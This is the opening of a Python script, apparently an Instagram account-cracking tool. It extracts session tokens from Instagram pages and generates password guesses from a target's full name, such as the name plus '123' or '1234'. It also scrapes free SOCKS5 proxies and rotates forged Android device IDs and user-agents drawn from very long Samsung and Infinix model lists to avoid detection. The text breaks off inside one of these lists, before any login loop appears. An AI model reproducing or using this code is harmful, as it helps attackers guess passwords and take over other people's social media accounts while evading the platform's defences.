#!/usr/bin/env python

""" @author: Khamdihi dev """

BLUE = "\033[0;34m"
END  = "\033[0m"
RED  = "\033[0;31m"
CYAN = "\033[0;36m"

GREEN       = "\033[0;32m"
LIGHT_CYAN  = "\033[1;36m"
LIGHT_WHITE = "\033[1;37m"

import re, requests, json, random, time, urllib, uuid, hashlib, os, sys, base64
from rich.tree import Tree
from rich import print as printf
from rich.console import Console
from rich.panel import Panel as Pan
from datetime import datetime
from bs4 import BeautifulSoup as bsp
from concurrent.futures import ThreadPoolExecutor as executor

console = Console()
session = requests.Session()
proxies = []
Input   = Console().input

M  = '#FF0000'
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

class ShowRich:
    def nel(self, text, type=None):
        if type is None:
           return printf(Pan(text,subtitle=f'{P2}┌─[ {H2}Choose {P2}]',subtitle_align='left',width=60,padding=1,style=M))
        else:
           return printf(Pan(text,width=60,padding=1,style=M))


class Require:
    def __init__(self):
        self.info,self.ex = {}, {}

    def data_graph(self, xxx):
        data = {
           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
           '__d': 'www',
           '__user': '0',
           '__a':'1',
           '__req': 'h',
           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
           'dpr': '2',
           '__ccg': 'GOOD',
           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
           '__s': '',
           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
           '__dyn': '',
           '__csr': '',
           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
           '__spin_b': 'trunk',
           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
           'fb_api_caller_class': 'RelayModern',
           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
           'server_timestamps': 'true',
           'doc_id': '6888165191230459'
        }
        return(data)

    def headers_graph(self, xxx):
        headers = {
           'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
           'x-ig-app-id': '1217981644879628',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
           'content-type': 'application/x-www-form-urlencoded',
           'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           'accept': '*/*',
        }
        return(headers)

    def ClientId(self, xxx):
        try:
            Clients = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
            return Clients
        except AttributeError:return('')
        except requests.exceptions.ConnectionError: time.sleep(5); self.ClientId(xxx)

    def AccountId(self, xxx):
        try:
            Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
            return(Userid)
        except AttributeError:return('')
        except requests.exceptions.ConnectionError: time.sleep(5); self.AccountId(xxx)

    def GetRespon(self, url, cok):
        try:
            req = requests.get(url, cookies = {'cookie': cok}).text
            return(req)
        except requests.exceptions.ConnectionError: time.sleep(5); self.GetRespon(url, cok)

    def Password(self, fullname):
        self.one, self.two = [], []
        for nama in fullname.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:self.one.append(nama+'123');self.one.append(nama+'1234');self.one.append(nama+'12345');self.one.append(nama.capitalize()+'123');self.one.append(nama.capitalize()+'1234');self.one.append(nama.capitalize()+'12345')
            else:self.one.append(nama);self.one.append(fullname);self.one.append(nama+'123');self.one.append(nama+'1234');self.one.append(nama+'12345');self.one.append(nama.capitalize()+'123');self.one.append(nama.capitalize()+'1234');self.one.append(nama.capitalize()+'12345')
        return(self.one)

    def Signature(self, data, body='SIGNATURE'):
        return 'signed_body={}.{}&ig_sig_key_version=4'.format(body, urllib.parse.quote_plus(data))

    def DeviceId(self):
        return 'android-%s'%(self.uuid_(True)[:16])

    def uuid_(self, abcd=None, zd=None):
        if zd is not None:
           m = hashlib.md5()
           m.update(zd.encode('utf-8'))
           i = uuid.UUID(m.hexdigest())
        else:
           i = uuid.uuid4()
           if abcd: return str(i.hex)
        return str(i)

    def adid(self, username):
        sha2 = hashlib.sha256()
        sha2.update(username.encode('utf-8'))
        abcd = sha2.hexdigest()
        return self.uuid_(False, abcd)

    def guid(self):
        return self.uuid_(False)

    def poid(self):
        return self.uuid_(False, self.guid())

    def socks(self):
        try:
            link = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'
            resp = requests.get(link.format('socks5'))
            for i in resp.text.splitlines():
                if i.isdigit:
                   if i not in proxies:
                      if len(i) > 21 or len(i) > 26:pass
                      else:proxies.append(i)
        except requests.exceptions.ConnectionError: time.sleep(5); self.socks()

    def UserAgent(self):
        self.android = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
        self.dpi     = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540'])
        self.version = random.choice(['113.0.5672.132', '113.0.5672.131', '113.0.5672.77', '113.0.5672.76', '112.0.5615.136', '112.0.5615.135', '112.0.5615.101', '112.0.5615.100', '112.0.5615.48', '112.0.5615.47', '111.0.5563.116', '111.0.5563.115', '111.0.5563.58', '111.0.5563.57', '111.0.5563.49', '111.0.5563.48', '110.0.5481.154', '110.0.5481.153', '110.0.5481.65', '110.0.5481.64', '110.0.5481.63', '110.0.5481.61', '109.0.5414.118', '109.0.5414.117', '109.0.5414.86', '109.0.5414.85', '108.0.5359.128', '108.0.5359.79', '108.0.5359.61', '107.0.5304.141', '107.0.5304.105', '107.0.5304.91', '107.0.5304.54', '106.0.5249.126', '106.0.5249.118', '106.0.5249.79', '106.0.5249.65', '105.0.5195.136', '105.0.5195.124', '105.0.5195.79', '105.0.5195.77', '105.0.5195.68', '104.0.5112.97', '104.0.5112.69', '103.0.5060.129', '103.0.5060.71', '103.0.5060.70', '103.0.5060.53', '102.0.5005.125', '102.0.5005.99', '102.0.5005.98', '102.0.5005.78', '102.0.5005.59', '102.0.5005.58', '101.0.4951.74', '101.0.4951.61', '101.0.4951.41', '101.0.4951.15 ', '100.0.4896.127', '100.0.4896.88'])
        self.samsung = random.choice(['samsung 19A', 'samsung a1', 'Samsung A10', 'Samsung A20', 'samsung A21', 'Samsung A33', 'Samsung A4', 'samsung A5', 'Samsung A50', 'Samsung A51', 'Samsung A52s', 'samsung A56', 'Samsung A7', 'samsung A7', 'Samsung A70', 'SAMSUNG A800F', 'SM-W750V', 'Trident/7.0', 'Trident/7.0', 'Samsung Chrome 11 (3180)', 'Samsung Chromebook Pro', 'Samsung Chromebook 3', 'Samsung Chromebook Plus (V2)', 'SAMSUNG F12', 'Samsung F41', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800', 'GT-I5800D', 'GT-I5800', 'GT-I5800', 'SAMSUNG SM-A716S', 'SM-A015F', 'SM-A015M', 'SM-A013M', 'SM-A013F', 'SM-A013G', 'SM-A022F', 'SM-A022M', 'SM-S124DL', 'SM-A025V', 'SM-A025G', 'SM-A025F', 'SM-A025U', 'SM-A025M', 'SM-A025F', 'SAMSUNG SM-A035G', 'SM-A035M', 'SM-A035F', 'SAMSUNG SM-A035M', 'SM-A032F', 'SM-A032M', 'SM-A037U', 'SM-A037U1', 'SM-S134DL', 'SAMSUNG SM-A037F', 'SM-A037M', 'SM-A045M', 'SM-A045F', 'SAMSUNG SM-A045F', 'SM-A042F', 'SM-A042M', 'SAMSUNG SM-A042F', 'SM-A047F', 'SAMSUNG SM-A047F', 'SM-A105FN', 'SAMSUNG SM-A105FN', 'SM-A105G', 'SM-A105M', 'U', 'SM-S102DL', 'SM-A102U', 'SAMSUNG SM-A102U', 'SAMSUNG SM-A102U1', 'SM-A107M', 'SM-A107F', 'SM-A107F', 'SM-A115F', 'SM-S115DL', 'SM-A115M', 'SM-A115F', 'SAMSUNG SM-A125F', 'SM-A127F', 'SM-A125U', 'SM-A137F', 'SM-A135F', 'SM-A135U1', 'SAMSUNG SM-A135F', 'SAMSUNG SM-A137F', 'SM-A135M', 'SM-A136U', 'SM-S136DL', 'SM-A136W', 'SM-A136B', 'SM-A145R', 'SAMSUNG SM-A145R/A145RXXU1AWD1', 'SM-A145F', 'SM-A145P', 'SAMSUNG SM-A145F', 'SM-A146U', 'SM-A146P', 'SM-A146U1', 'SAMSUNG SM-A146U', 'SM-A260G', 'SM-A260F', 'SM-A260F', 'SM-A205U', 'SAMSUNG SM-A205U1', 'SM-A205F', 'SM-A205W', 'SM-A205G', 'SM-S205DL', 'SM-A205GN', 'SM-A202F', 'SAMSUNG SM-A202F', 'SM-A207F', 'SM-A207M', 'SM-S215DL', 'SM-A215U1', 'SAMSUNG SM-S215DL', 'SM-A102J', '720x1448', 'SC-42A', 'SM-A217F', 'SAMSUNG SM-A217F', 'SM-A217M', 'U', 'SM-A225F', 'SM-A225M', 'SAMSUNG SM-A225F', 'SAMSUNG SM-A226B', 'SM-A226BR', 'SM-A235F', 'SM-A235N', 'SM-A236B', 'SM-A236E', 'SM-A236U', 'SAMSUNG SM-A236M', 'SAMSUNG SM-A236U1', 'SM-A236V', 'SM-A245F', 'SAMSUNG SM-A245F', 'SM-A245M', 'Samsung Galaxy A24', 'SM-A300FU', 'SM-A300H', 'SM-A310F', 'SAMSUNG SM-A310F', 'SM-A310F', 'SM-A310M', 'SM-A320F', 'SM-A320FL', 'SAMSUNG SM-A320FL', 'SM-A305FN', 'SM-A305GN', 'SM-A305N', 'SM-A305GT', 'Flow', 'SM-A307FN', 'SM-A307GT', 'SM-A307GN', 'SM-A315G', 'SM-A315F', 'SM-A315N', 'SM-A325F', 'SM-A325M', 'SAMSUNG SM-A325F', 'SM-A326W', 'SM-A326U', 'SM-A326B', 'SAMSUNG SM-A326B', 'SM-S326DL', 'SM-A336B', 'SAMSUNG SM-A336E', 'SM-A336M', 'SM-A336N', 'SM-A346B', 'SM-A346M', 'SAMSUNG SM-A346M', 'SM-A3460', 'SM-A346E', 'SAMSUNG SM-A346B/A346BXXU1AWB9', 'SAMSUNG SM-A346E', 'SAMSUNG SM-A430F', 'SM-A405FN', 'SAMSUNG SM-A405FN', 'SM-A405FN', 'SM-A405FN/DS', 'SM-A405S', 'SM-A3050', 'SM-A3051', 'SM-A3058', 'SM-A415F', 'SC-41A', 'SM-A4260', 'SM-A426U', 'SM-A426U1', 'SM-A426U', 'SM-A426B', 'SAMSUNG SM-A426B/A426BXXU4DVL3', 'SM-A426N', 'SAMSUNG SM-A426U', 'SM-A5009', 'SM-A500YZ', 'SM-A500W', 'SM-A500L', 'SAMSUNG SM-A500W', 'SAMSUNG SM-A500L', 'SM-A500X', 'SM-A500XZ', 'SM-A500XZ', 'SM-A500XZ', 'SM-A510F', 'SAMSUNG SM-A510F', 'SM-A510F', 'SM-A520F', 'SAMSUNG SM-A520F', 'SM-A520K', 'SM-A500M', 'SM-A500H', 'SM-A500F', 'SM-A500F', 'SM-A500FU', 'SM-A505FN', 'SM-A505G', 'SM-A505FM', 'SM-A505U', 'SM-A507FN', 'SM-A515F', 'SM-A515F', 'SM-A515U', 'SM-A516U', 'SM-A516B', 'SM-A516B/DS', 'SM-A516N', 'SC-54A', 'SM-A516V', 'SCG07', 'SM-A525F', 'SAMSUNG SM-A525F', 'SM-A525M', 'SAMSUNG SM-A526B', 'SM-A526W', 'SM-A526U', 'SM-A5260', 'SM-A528B', 'SAMSUNG SM-A528B', 'SAMSUNG SM-A528B/A528BXXU3EWE1', 'SM-A536E', 'SM-A536B', 'SAMSUNG SM-A536E', 'SM-A5360', 'SM-A536U', 'SM-A536U1', 'SM-A536V', 'SAMSUNG SM-A536V', 'SM-A546U1', 'SM-A546E', 'SM-A546B', 'SM-A5460', 'SAMSUNG SM-A546U', 'SM-A546W', 'SM-A546V', 'SAMSUNG SM-A600FN', 'SM-A600G', 'SM-A605FN', 'SM-A605G', 'SM-A6050', 'SM-A605GN/DS', 'SAMSUNG SM-A605FN', 'SM-A6060', 'SM-A606Y', 'SAMSUNG SM-A606Y', 'SM-G6200', 'SM-G6200', 'SM-A7000', 'SM-A700FD', 'SM-A700K', 'SM-A700H', 'SM-A700YD', 'SM-A710F', 'SM-A7100', 'SM-A710K', 'SM-A710M', 'SM-A720F', 'SM-A750FN', 'SAMSUNG SM-A750FN', 'SM-A750N', 'SM-A750GN', 'SM-A705FN', 'SM-A705MN', 'SM-A705GM', 'SM-A705W', 'SM-A707F', 'SAMSUNG SM-A707F', 'SAMSUNG SM-A7070', 'SM-A715F', 'SM-A715W', 'SM-A715F', 'SM-A715F', 'SM-A716U', 'SM-A716U1', 'SAMSUNG SM-A716U', 'SM-A716V', 'SAMSUNG SM-A716U1', 'SM-A725F', 'SM-A725M', 'SAMSUNG SM-A725F', 'SAMSUNG SM-A736B', 'SM-A736B', 'SM-A530F', 'SAMSUNG SM-A530F', 'SM-A8000', 'SM-A810F', 'SM-A810YZ', 'SAMSUNG SM-A810YZ', 'SM-A810S', 'SM-A530N', 'SM-A530W', 'SAMSUNG SM-A530W', 'SAMSUNG SM-G885F', 'SM-G885Y', 'SAMSUNG SM-G885S', 'SAMSUNG SM-G885Y', 'samsung SM-G885F', 'SM-A730F', 'SM-A805F', 'SAMSUNG SM-A805F', 'SM-A8050', 'SM-A805N', 'SM-G8870', 'SM-G887F', 'SM-A8s', 'SAMSUNG SM-G8870', 'SM-A9000', 'SM-A920F', 'SAMSUNG SM-A920F/A920FXXS7CVI7', 'U', 'SM-A910F', 'SM-G887N', 'SM-G887N', 'SM-A910F', 'SM-A9100', 'SM-G8850', 'SAMSUNG SM-G8850', 'SM-G8858', 'SM-G8850', 'SAMSUNG SM-A908B', 'SM-A908N', 'SAMSUNG SM-A908B/A908BXXU5EVK3', 'SAMSUNG SM-A908B/A908BXXU5EVG6', 'SAMSUNG SM-A9080', 'SM-A9080', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830', 'GT-S5830M', 'GT-S5830i', 'GT-S5830i', 'GT-S5830L', 'GT-S5830G', 'GT-S5830M', 'GT-S5830M', 'GT-S5830C', 'GT-S5830V', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'GT-I8160P', 'GT-I8160', 'GT-I8160P-ORANGE/I8160PBVLK3', 'GT-I8160', 'GT-I8160', 'GT-I8160', 'SAMSUNG GT-I8160/I8160BOLK2', 'SAMSUNG GT-S7275R/S7275RXXUAMK2', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275R', 'SAMSUNG GT-S7275R-ORANGE', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275B', 'GT-S7275B', 'GT-S7275B', 'GT-S7275T', 'GT-S7275Y', 'SM-G313HY', 'SM-G313MY', 'SM-G313MU', 'SM-G316MY', 'SM-G316M', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G313HZ', 'SM-G313HU', 'SM-G313U', 'SM-G318H', 'GT-S7500', 'GT-S7500', 'SAMSUNG GT-S7500/S7500BUMB1', 'GT-S7500', 'GT-S7500', 'GT-S7500T', 'GT-S7500', 'GT-S7500W', 'GT-S7500T', 'GT-S7500L', 'GT-S7500L', 'GT-S7500T', 'GT-S7500L', 'GT-S7500T', 'SM-G357FZ', 'SM-G310HN', 'SAMSUNG SM-G357FZ/G357FZXXU1AOE1', 'SM-G357FZ', 'SC-01H', 'SC-01H', 'SM-G850F', 'SM-G850F', 'SM-G850M', 'SAMSUNG-SM-J327AZ', 'SAMSUNG SM-J327AZ', 'SM-J337AZ', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'SM-G386T', 'SM-G386T1', 'SM-G386T1', 'SAMSUNG SM-G386T', 'SM-G386T', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'SM-G3858', 'SM-G3858', 'SAMSUNG-SM-G3858_TD/1.0 Android/4.2.2 Release/10.15.2013 Browser/AppleWebKit534.30', 'SM-G3858', 'SM-G3858', 'SM-G3858', 'SM-A226L', 'SAMSUNG SM-A226L', 'SM-M236L', 'SAMSUNG SM-M236L', 'SM-C5000', 'SAMSUNG SM-C5000', 'SAMSUNG SM-C500X', 'SM-C5010', 'SAMSUNG SM-C5010', 'SAMSUNG SM-C5018', 'SM-C7000', 'SAMSUNG SM-C7000', 'SM-C7000', 'SM-C7010', 'SM-C701F', 'SAMSUNG SM-C7010', 'SAMSUNG SM-C701F', 'SM-C7018', 'SAMSUNG SM-C7100', 'SM-C7108', 'SAMSUNG SM-C7108', 'SM-C9000', 'SM-C900F', 'SM-C900Y', 'EK-GC100', 'EK-GC100', 'EK-GC100', 'EK-GC120', 'EK-GC200', 'EK-GC200', 'EK-GC110', 'EK-GC110', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330B', 'GT-B5330B', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330L', 'GT-I8262', 'GT-I8262', 'GT-I8262', 'GT-I8260', 'GT-I8262', 'GT-I8262B', 'GT-I8262D', 'GT-I8262D', 'GT-I8262B', 'SM-G355H', 'SM-G355M', 'SHW-M570S', 'SAMSUNG GT-I8580', 'SHW-M570S', 'SAMSUNG SHW-M570S', 'GT-I8580', 'GT-I8580', 'GT-I8580', 'SAMSUNG GT-I8580', 'SM-G3589W', 'SM-G3589W', 'SM-G3589W', 'SAMSUNG-SM-G3589W', 'SM-G386W', 'SM-G386F', 'SM-G3518', 'SM-G3586V', 'SM-G3586V', 'SM-G3518', 'SM-G3518', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G3568V', 'SM-G3568V', 'SM-G350E', 'SM-G350', 'SM-G3509I', 'SM-G3508J', 'SM-G3502I', 'SM-G3502C', 'SM-G360BT', 'SM-S820L', 'SM-G360H', 'SM-G360F', 'SM-G360T', 'SM-G360M', 'SM-G361H', 'SM-G361F', 'SM-G361HU', 'SAMSUNG SM-G361H', 'SCH-R740C', 'SGH-S730M', 'SGH-S730G', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SM-E500H', 'SM-E500F', '720x1280', 'SM-E500M', 'SM-E5000', 'SM-E500YZ', 'SM-E700H', 'SM-E700F', 'SM-E7009', 'SM-E700M', 'GT-I8730', 'GT-I8730', 'GT-i8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730T', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCOE1', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCNH1', 'SM-E025F', 'SM-F127G', 'SM-E135F', 'SM-E225F', 'SM-E236B', 'SAMSUNG SM-E236B', 'SM-F415F', 'SM-E426B', 'SAMSUNG SM-E426B', 'SM-E5260', 'SAMSUNG SM-E5260', 'SM-E625F', 'GT-S6810M', 'GT-S6810', 'GT-S6810P', 'GT-S6810B', 'GT-S6810L', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810E', 'GT-S6810M', 'GT-S6810P', 'GT-S6812C', 'GT-S6812', 'GT-S6812i', 'GT-S6812i', 'GT-S6812C', 'GT-S6812i', 'GT-S6812i', 'GT-S6812i', 'GT-S6812B', 'GT-S6812i', 'GT-S6812B', 'GT-S6812B', 'GT-S6790L', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790L', 'SC-04J', 'SC-02L', 'SM-F907B', 'SM-F900U', 'SM-F900F', 'SM-F907N', 'SM-F9000', 'SM-F900U1', 'SM-F900W', 'SM-G150NL', 'SM-G155S', 'SM-G150N0', 'SM-G150NS', 'SM-G1650', 'SM-W2015', 'SM-W2015', 'SAMSUNG-SM-W2015', 'GT-I9128I', 'GT-I9128I', 'GT-I9128E', 'SM-G7102', 'SM-G7102', 'SM-G7105', 'SM-G7106', 'SM-G7108', 'GT-I9082', 'GT-I9082', 'GT-I9082C', 'SM-G7202', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G7200', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G720N0', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G720N0', 'SM-G7202', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9168I', 'GT-I9168I', 'SAMSUNG-GT-I9168_TD Release/1.15.2014 Browser/AppleWebKit/534.30', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'SM-G531F', 'SM-G531H', 'SM-G530T', 'SM-G530H', 'SM-G530BT', 'SM-G530FZ', 'SM-G532F', 'SM-G531M', 'SM-G531BT', 'SAMSUNG-SM-J727AZ', 'SM-J100FN', 'SM-J100H', 'SM-J120H', 'SM-J120F', 'SM-J120FN', 'SM-J120H', 'SM-J111F', 'SM-J111M', 'SM-J110H', 'SM-J111M', 'SM-J110G', 'SM-J110F', 'SM-J105B', 'SM-J105H', 'SM-J105Y', 'SM-J106F', 'SM-J106H', 'SM-J106B', 'SM-J106M', 'SM-J200GU', 'SM-J200F', 'SM-J200M', 'SM-J200H', 'SM-J260F', 'SM-J260M', 'SM-J260G', 'SM-J260FU', 'SM-J260MU', 'SM-J260Y', 'SM-J200BT', 'SAMSUNG SM-J200BT', 'SM-G532G', 'SM-G532M', 'SM-G532MT', 'SM-J250G', 'SM-J250M', 'SM-J250F', 'SM-J250Y', 'SAMSUNG SM-J260AZ', 'SM-J3109', 'SM-J320Y', 'SM-J320H', 'SM-J320G', 'SM-J320FN', 'SM-J320V', 'SM-J320M', 'SAMSUNG-SM-J320A', 'SM-J330FN', 'SAMSUNG SM-J330F', 'SAMSUNG SM-J330FN/J330FNXXS4CUD3', 'SM-J330G', 'SM-J337P', 'SM-J337V', 'SAMSUNG SM-J337W', 'SM-J337U', 'SM-J337VPP', 'SM-J337R4', 'SM-J327V', 'SM-J327P', 'SM-J327R4', 'SM-S327VL', 'SM-S337TL', 'SAMSUNG SM-S327VL', 'SM-J327VPP', 'SM-S367VL', 'SAMSUNG SM-S367VL', 'SM-S357BL', 'SM-J327T1', 'SM-J3110', 'SM-J3119S', 'SAMSUNG-SM-J3119', 'SM-S320VL', 'SM-J337T', 'SM-J400F', 'SM-J400M', 'SM-J400G', 'SM-J400M', 'SM-J410F', 'SM-J410G', 'SM-J410F', 'SM-J410F', 'SM-J410F', 'SM-J415FN', 'SM-J415GN', 'Galaxy j5', 'SM-J500M', 'SM-J500G', 'SM-J500F', 'SM-J500H', 'SM-J500FN', 'SM-J510H', 'SM-J510FQ', 'SM-J510FN', 'SM-J510MN', 'SM-J510MN', 'SM-J510GN', 'SM-J530F', 'SAMSUNG SM-J530F/J530FXXS9CUE5', 'SM-G570M', 'SM-G570F', 'SM-G570Y', 'SM-J530Y', 'SAMSUNG SM-J530G', 'SM-J600FN', 'SM-J600GT', 'SM-J610FN', 'SM-J610F', 'SM-J610G', 'SM-J710F', 'SM-J700M', 'SM-J700H', 'SM-J710MN', 'SM-J710K', 'SM-J7108', 'SM-J700F', 'SM-J700P', 'SM-J710GN', 'SM-J700T', 'SM-J700T1', 'SAMSUNG SM-J727A', 'SM-J730K', 'SM-J727R4', 'SM-J727S','SM-J727U'])
        self.infinix = random.choice(['Infinix F98', 'Infinix G636', 'Infinix X507', 'Infinix X507', 'Infinix Hot 10', 'Infinix X682B', 'Infinix X682C', 'Infinix X682B', 'Infinix X682C', 'MZ-Infinix X688C', 'Infinix X688B', 'Infinix X688C', 'Infinix X688B', 'Infinix X659B', 'Infinix PR652B', 'Infinix PR652B', 'Infinix X658E', 'Infinix PR652C', 'Infinix X689B', 'Infinix X689D', 'Infinix X689D', 'Infinix X689C', 'Infinix X662', 'Infinix X689F', 'MZ-Infinix X662B', 'Infinix X675', 'Infinix X675', 'Infinix X6812B', 'Infinix X6817', 'Infinix X6817B', 'Infinix X6816C', 'Infinix X6816', 'Infinix X6816D', 'Infinix X6816D', 'Infinix X668', 'Infinix X668C', 'Infinix X665B', 'Infinix X665', 'Infinix X665B', 'Infinix X510', 'Infinix X510', 'Infinix X6826B', 'Infinix X6826C', 'Infinix X6826B', 'Infinix X666B', 'Infinix X6825', 'Infinix X665E', 'Infinix X665C', 'Infinix X6827', 'Infinix X6827', 'Infinix HOT 3', 'Infinix HOT 3 LTE', 'Infinix-X554', 'Infinix HOT 3 Pro', 'Infinix X6831', 'Infinix X669', 'Infinix X669C', 'Infinix X669D', 'Infinix HOT 4', 'Infinix HOT 4 Lite', 'Infinix HOT 4 Pro', 'Infinix_X556_LTE', 'Infinix X559C', 'Infinix X559C', 'Infinix X559F', 'Infinix X559C', 'Infinix X606B', 'Infinix X606D', 'Infinix X606D', 'Infinix X606C', 'Infinix X608', 'Infinix X623', 'Infinix X624B', 'ar_AE Infinix X624', 'fr_FR Infinix X624', 'Infinix X625B', 'Infinix X625C', 'Infinix X625C', 'Infinix X625D', 'Infinix X650C', 'Infinix X650D', 'Infinix X650B', 'Infinix X650', 'Infinix X650C Flow', 'Infinix X650B', 'Infinix X650B', 'Infinix X650D', 'Infinix X655C', 'Infinix X655C', 'Infinix X655D', 'Infinix X680B', 'Infinix X655F', 'INFINIX-X551', 'Infinix-X551', 'Infinix-X551', 'INFINIX-X551', 'INFINIX-X551', 'Infinix_X521S', 'Infinix-X521', 'Infinix_X521_LTE', 'Infinix HOT S', 'Infinix-X521', 'Infinix_X521', 'Infinix X573', 'Infinix X573', 'Infinix X573B', 'Infinix X622', 'Infinix X622', 'Infinix Hot V3', 'Infinix HOT4 LTE', 'Infinix X693', 'Infinix X693', 'Infinix X695', 'Infinix X695C', 'Infinix X695D', 'MZ-Infinix X695C', 'Infinix X663', 'Infinix X663B', 'Infinix X697', 'Infinix X697', 'Infinix X698', 'Infinix X698', 'Infinix X670', 'Infinix X670', 'Infinix X676C', 'Infinix X663D', 'Infinix X676B', 'Infinix X671B', 'Infinix X672', 'Infinix X6819', 'Infinix X6819', 'Infinix X6819', 'Infinix X677', 'Infinix X677', 'Infinix-X600-LTE', 'Infinix NOTE 2', 'Infinix-X600-LTE', 'Infinix NOTE 2 LTE', 'Infinix NOTE 3', 'Infinix_X601_LTE', 'Infinix NOTE 3', 'Infinix NOTE 3 Pro', 'Infinix NOTE 3 Pro', 'Infinix X572', 'Infinix X572-LTE', 'Infinix X572', 'Infinix X572', 'Infinix X571', 'Infinix X604', 'Infinix X604B', 'Infinix X605', 'Infinix X610B', 'Infinix X610B', 'Infinix X610B', 'Infinix X690', 'Infinix X690B', 'Infinix X690B', 'Infinix X656', 'Infinix X656', 'Infinix X692', 'Infinix X692', 'Infinix X683B', 'Infinix X450', 'Infinix X5010', 'Infinix X5010', 'Infinix X401', 'Infinix S2', 'Infinix S2 Pro', 'Infinix S2 Pro', 'Infinix X626B', 'Infinix X626B', 'Infinix X626', 'Infinix X626B', 'Infinix X652A', 'Infinix X652', 'Infinix X652', 'Infinix X652A', 'Infinix X652A', 'Infinix X652B', 'Infinix X652C', 'Infinix X660C', 'Infinix X660C', 'Infinix X660B', 'Infinix X660C', 'Infinix X5515F', 'Infinix X5515I', 'Infinix X609', 'fr_MA Infinix X609', 'Infinix X5514D', 'Infinix X5516B', 'Infinix X5516C', 'Infinix X627', 'Infinix X627', 'Infinix X627', 'Infinix X653C', 'Infinix X680', 'Infinix X653', 'ar_AE Infinix X680', 'ar_AE Infinix X653', 'Infinix X680D', 'Infinix X657', 'Infinix X657B', 'Infinix X657C', 'Infinix X657', 'Infinix X657B', 'Infinix X6511', 'Infinix X6511B', 'Infinix X6511E', 'Infinix X6512', 